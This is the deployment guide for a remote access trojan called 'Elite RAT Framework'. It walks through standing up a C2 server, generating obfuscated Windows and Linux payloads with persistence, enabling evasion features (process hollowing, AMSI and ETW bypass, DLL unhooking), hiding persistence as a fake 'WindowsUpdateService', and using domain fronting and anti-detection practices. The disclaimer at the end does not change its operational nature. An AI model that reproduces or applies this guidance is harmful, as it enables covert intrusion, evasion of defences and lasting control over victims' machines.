# 🚀 Elite RAT Framework - Deployment Guide

## Prerequisites

### System Requirements
- **OS**: Windows 10/11, Server 2016+ | Linux (Ubuntu 20.04+, Debian 10+)
- **Python**: 3.8 or higher
- **Memory**: Minimum 4GB RAM
- **Disk**: 500MB free space
- **Network**: Outbound HTTPS (443) or configurable port

### Required Dependencies
```bash
pip install -r requirements.txt
```

Key packages:
- Flask & Flask-SocketIO (Web interface)
- cryptography (Encryption)
- psutil (System operations)
- pyinstaller (Payload generation)

## Installation

### 1. Clone Repository
```bash
git clone https://github.com/yourusername/elite-rat.git
cd elite-rat
```

### 2. Install Dependencies
```bash
pip install -r requirements.txt
```

### 3. Configure Environment

Create `.env` file:
```bash
# C2 Configuration
ELITE_C2_HOST=your.domain.com
ELITE_C2_PORT=443
ELITE_C2_PROTOCOL=https

# Security
ELITE_ENCRYPTION_KEY=<generate-with-openssl-rand-hex-32>
STITCH_ADMIN_USER=admin
STITCH_ADMIN_PASSWORD=<strong-password>

# Optional
ELITE_BEACON_INTERVAL=60
ELITE_ENABLE_EVASION=true
STITCH_ENABLE_HTTPS=true
```

### 4. Generate SSL Certificates (for HTTPS)
```bash
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
```

## Starting the C2 Server

### Development Mode
```bash
python web_app_real.py
```

### Production Mode
```bash
# With Gunicorn
gunicorn -w 4 -b 0.0.0.0:5000 --certfile=cert.pem --keyfile=key.pem web_app_real:app

# With systemd service
sudo systemctl start elite-rat
```

### Docker Deployment
```dockerfile
FROM python:3.9-slim
WORKDIR /app
COPY requirements.txt .
RUN pip install -r requirements.txt
COPY . .
EXPOSE 5000
CMD ["python", "web_app_real.py"]
```

## Payload Generation

### Windows Executable
```bash
python create_payload.py --target windows --host your.domain.com --port 443
```

### Linux Binary
```bash
python create_payload.py --target linux --host your.domain.com --port 443
```

### Options
- `--obfuscate`: Enable code obfuscation
- `--encrypt`: Encrypt payload
- `--icon <path>`: Custom icon (Windows)
- `--persistence`: Include persistence

## Security Configuration

### 1. Enable All Evasion Features
Edit `Core/config.py`:
```python
"evasion": {
    "process_injection": True,
    "process_hollowing": True,
    "ppid_spoofing": True,
    "etw_bypass": True,
    "amsi_bypass": True,
    "dll_unhooking": True,
    "direct_syscalls": True,
    "sleep_mask": True
}
```

### 2. Configure Persistence Methods
```python
"persistence": {
    "registry_key": r"Software\Microsoft\Windows\CurrentVersion\Run",
    "service_name": "WindowsUpdateService",
    "scheduled_task": "SystemMaintenance",
    "wmi_subscription": True
}
```

### 3. Set Operation Parameters
```python
"operation": {
    "beacon_interval": 60,
    "jitter": 20,
    "working_hours_only": True,
    "working_hours_start": 9,
    "working_hours_end": 17,
    "kill_date": "2025-12-31"
}
```

## Network Configuration

### Firewall Rules
```bash
# Allow inbound C2
sudo ufw allow 5000/tcp

# For reverse proxy
sudo ufw allow 443/tcp
```

### Nginx Reverse Proxy
```nginx
server {
    listen 443 ssl;
    server_name your.domain.com;
    
    ssl_certificate /path/to/cert.pem;
    ssl_certificate_key /path/to/key.pem;
    
    location / {
        proxy_pass http://127.0.0.1:5000;
        proxy_http_version 1.1;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection "upgrade";
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
    }
}
```

### Domain Fronting (CDN)
Configure with Cloudflare/AWS CloudFront for additional obfuscation.

## Operational Security

### Do's
- ✅ Always use HTTPS
- ✅ Rotate encryption keys regularly
- ✅ Use unique service names
- ✅ Enable all evasion features
- ✅ Test in isolated environment first
- ✅ Monitor for detection
- ✅ Use domain fronting when possible

### Don'ts
- ❌ Never use default credentials
- ❌ Don't expose C2 directly to internet
- ❌ Don't reuse infrastructure
- ❌ Don't run without authorization
- ❌ Don't ignore operational security
- ❌ Don't leave default configurations

## Monitoring & Logs

### View Logs
```bash
tail -f logs/elite-rat.log
```

### Log Levels
- DEBUG: All operations
- INFO: Normal operations
- WARNING: Potential issues
- ERROR: Operation failures
- CRITICAL: System failures

### Metrics Dashboard
Access at: `https://your.c2.server/metrics`

## Troubleshooting

### Connection Issues
1. Check firewall rules
2. Verify SSL certificates
3. Confirm network connectivity
4. Check proxy configuration

### Payload Issues
1. Verify target architecture
2. Check AV exclusions
3. Confirm C2 address
4. Test with verbose logging

### Performance Issues
1. Increase worker threads
2. Enable caching
3. Optimize database queries
4. Use CDN for static assets

## Updates & Maintenance

### Update Framework
```bash
git pull origin main
pip install -r requirements.txt --upgrade
```

### Backup Configuration
```bash
cp Core/config.py Core/config.py.backup
cp .env .env.backup
```

### Database Maintenance
```bash
python manage_db.py --vacuum
python manage_db.py --backup
```

## Legal Notice

⚠️ **WARNING**: This framework is for authorized security testing only.

- Only deploy with explicit written authorization
- Follow all applicable laws and regulations
- Maintain detailed audit logs
- Report findings responsibly
- Never use for unauthorized access

## Support

- Documentation: `/docs`
- Issues: GitHub Issues
- Wiki: GitHub Wiki

---

**Remember**: With great power comes great responsibility. Use ethically and legally.